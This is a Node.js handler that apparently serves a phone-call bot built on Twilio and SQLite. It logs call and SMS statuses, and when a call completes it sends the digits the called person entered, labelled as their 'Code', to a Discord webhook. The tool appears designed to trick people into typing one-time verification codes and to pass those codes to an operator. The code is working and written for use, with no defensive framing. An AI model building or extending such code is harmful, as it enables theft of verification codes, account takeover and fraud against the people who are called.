module.exports = function(request, response) {
    /**
     * File containing the configurations necessary for the correct functioning of the system
     */
    const config = require('.././config');

    /**
     * Instantiating dependencies allowing the use of the discord webhook
     */
    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    /**
     * Integration of SQLITE3 dependencies
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Retrieval of the posted variables allowing to order the modification of the status
     */
    var itsfrom = request.body.From || null;
    var itsto = request.body.To || null;
    var sid = request.body.CallSid;
    var date = Date.now();
    var status;

    /**
     * Initiation of variables used to define SQL queries
     */
    var table = null;
    var sidname = null;

    /**
     * If there is an sid with the CallSid, ​​then it is a call, otherwise it is an SMS.
     */
    if (sid != undefined) {
        status = request.body.CallStatus;
        table = 'calls';
        sidname = 'callSid';
    } else {
        sid = request.body.SmsSid;
        status = request.body.SmsStatus;
        table = 'sms';
        sidname = 'smssid';
    }

    if (itsfrom == null || itsto == null || sid == undefined || sid == null) {
        return response.status(200).json({
            error: 'Please send all the needed post data.'
        });
    }

    /**
     * We check if there is not already the data recorded in DB
     */
    db.get('SELECT ' + sidname + ' text FROM ' + table + ' WHERE ' + sidname + ' = ?', [sid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * If it is not registered, we insert it for the first time
         */
        if (row == undefined) {
            db.run('INSERT INTO ' + table + '(itsfrom, itsto, status, ' + sidname + ', date) VALUES(?, ?, ?, ?, ?)', [itsfrom, itsto, status, sid, date], function(err) {
                if (err) {
                    return console.log(err.message);
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });
        } else {
            /**
             * Otherwise we update it, mainly the status
             */
            db.run('UPDATE ' + table + ' SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ' + sidname + ' = ?', [status, itsfrom, itsto, date, sid], function(err) {
                if (err) {
                    return console.log(err.message);
                }

                /**
                 * If it is a call status and it is finished (completed), then we send a webhook
                 * containing the "digits" the code retrieved during the call.
                 * 
                 *We also check if the webhook link is well defined, otherwise we do not send a webhook.
                 */
                if (table == 'calls' && status == 'completed' && config.discordwebhook != undefined) {
                    /**
                     * We get all the information on the call
                     */
                    db.get('SELECT * FROM calls WHERE callSid  = ?', [sid], (err, row) => {
                        if (err) {
                            return console.error(err.message);
                        }

                        /**
                         * Si le code est vide, alors la personne n'as pas répondue / donné de code
                         */
                        var embed;

                        /**
                         * If there was the registered code, then we define the embed to send
                         */
                        if (row.digits == '' || row.digits == undefined) {
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('15105570')
                                .setDescription(':man_detective: The user didn\'t respond or enter the code.')
                                .setFooter(row.user)
                                .setTimestamp();
                        } else {
                            /**
                             * If it is a test call, do not fully supply the code
                            */
                            if (row.user == 'test') row.digits = row.digits.slice(0, 3) + '***';

                            /**
                             * She gave the code, we can send it
                             */
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('1752220')
                                .setDescription(`:man_detective: Code : **${row.digits}**`)
                                .setFooter(row.user)
                                .setTimestamp();
                        }

                        /**
                         * Sending the embed to the webhook
                         */
                        hook.send(embed);
                    });
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });


        }
    });
};